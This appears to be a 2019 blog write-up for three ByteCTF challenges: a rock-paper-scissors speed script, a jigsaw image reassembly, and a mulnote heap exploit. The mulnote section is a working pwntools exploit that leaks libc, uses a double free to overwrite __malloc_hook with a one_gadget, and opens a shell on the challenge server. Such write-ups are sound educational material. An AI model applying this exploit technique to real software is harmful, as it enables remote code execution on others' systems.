---
layout: post
title:  "ByteCTF-Writeup"
date:   2019-9-9
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# ByteCTF-Writeup

* ### betgame

  白给，手速题

  ```python
  from pwn import *
  r = remote('112.125.25.81',9999)
  
  s = ['s','j','b']
  b = ['b','s','j']
  j = ['j','b','s']
  for i in range(0,30):
  	r.recvuntil('I will use: ')
  	fuck = r.recv(1)
  	if fuck == 's':
  		r.sendline(s[i%3])
  	if fuck == 'b':
  		r.sendline(b[i%3])
  	if fuck == 'j':
  		r.sendline(j[i%3])
  r.interactive()
  ```

* ### jigsaw 

  ```python
  # -*- coding:utf-8 -*-
  import os
  from PIL import Image
  import PIL.Image as Image
  import os
   
  IMAGES_PATH = '\\d9710b4ddcbf457cb716ee5423c7f32e\\pics\\'  # 图片集地址
  IMAGES_FORMAT = ['.jpg', '.JPG']  # 图片格式
  IMAGE_SIZE = 64  # 每张小图片的大小
  IMAGE_ROW = 11  # 图片间隔，也就是合并成一张图后，一共有几行
  IMAGE_COLUMN = 21  # 图片间隔，也就是合并成一张图后，一共有几列
  IMAGE_SAVE_PATH = '\\d9710b4ddcbf457cb716ee5423c7f32e\\final.jpg'  # 图片转换后的地址
   
  # 获取图片集地址下的所有图片名称
  image_names = [name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if
                 os.path.splitext(name)[1] == item]
   
  # 简单的对于参数的设定和实际图片集的大小进行数量判断
  if len(image_names) != IMAGE_ROW * IMAGE_COLUMN:
      raise ValueError("合成图片的参数和要求的数量不能匹配！")
   
  # 定义图像拼接函数
  def image_compose():
      to_image = Image.new('RGB', (IMAGE_COLUMN * IMAGE_SIZE, IMAGE_ROW * IMAGE_SIZE)) #创建一个新图
      # 循环遍历，把每张图片按顺序粘贴到对应位置上
      for y in range(1, IMAGE_ROW + 1):
          for x in range(1, IMAGE_COLUMN + 1):
              from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize(
                  (IMAGE_SIZE, IMAGE_SIZE),Image.ANTIALIAS)
              to_image.paste(from_image, ((x - 1) * IMAGE_SIZE, (y - 1) * IMAGE_SIZE))
      return to_image.save(IMAGE_SAVE_PATH) # 保存新图
  image_compose() #调用函数
  
  ```

  先把图片拼起来

  然后用gaps跑

  ```
  gaps --image=12311.jpg --generations=20 --population=600 --verbose --size=64
  ```

  ![1](https://raw.githubusercontent.com/AiDaiP/images/master/suctf2019/1.jpg)

* ### mulnote 

  先搞一个unsorted bin泄露libc

  然后double free改fd申请到malloc_hook，改成one_gadget

  ```python
  from pwn import *
  r = remote('112.126.101.96',9999)
  #r = process('./mulnote')
  elf = ELF('./mulnote')
  libc = ELF('./libc.so')
  def create(size,note):
  	r.sendlineafter('>','C')
  	r.sendlineafter('size>',str(size))
  	r.sendafter('note>',note)
  
  def edit(index,note):
  	r.sendlineafter('>','E')
  	r.sendlineafter('index>',str(index))
  	r.sendafter('new note>',note)
  
  def remove(index):
  	r.sendlineafter('>','R')
  	r.sendlineafter('index>',str(index))
  
  def show():
  	r.sendlineafter('>','S')
  
  
  create(1000,'fuck')
  remove(0)
  show()
  r.recvuntil('note[0]:\n')
  main_arena_88 = u64(r.recvuntil('\n',drop = True).ljust(8,'\x00'))
  main_arena = main_arena_88 - 88
  libc_base = main_arena - 0x3c4b20
  log.success('main_arena:'+hex(main_arena))
  log.success('libc_base:'+hex(libc_base))
  fuck_addr = libc_base + 0x3c4aed
  one = libc_base + 0x4526a
  log.info('fuck_addr:'+hex(fuck_addr))
  log.info('one:'+hex(one))
  create(0x60,'fuck')
  create(0x60,'fuck')
  remove(1)
  remove(2)
  remove(1)
  create(0x60,p64(fuck_addr))
  create(0x60,p64(fuck_addr))
  create(0x60,p64(fuck_addr))
  create(0x60,p8(0)*3 + p64(0)*2 + p64(one))
  
  r.interactive()
  ```

  